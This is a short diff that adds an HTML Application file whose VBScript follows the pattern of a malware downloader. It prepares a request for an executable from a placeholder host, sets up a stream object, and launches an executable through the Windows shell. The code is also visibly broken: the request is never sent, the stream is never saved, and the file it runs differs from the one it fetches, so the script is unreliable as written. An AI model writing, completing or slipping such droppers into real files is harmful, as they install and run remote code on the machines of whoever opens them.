@@ -1,0 +1,7 @@
+<HTA:APPLICATION ID="z"><script language="VBScript">
+Set x = CreateObject("MSXML2.XMLHTTP")
+x.Open "GET", "http://example.invalid/a.exe", False
+Set s = CreateObject("ADODB.Stream")
+CreateObject("WScript.Shell").Run "c:\x.exe"
+</script>
+
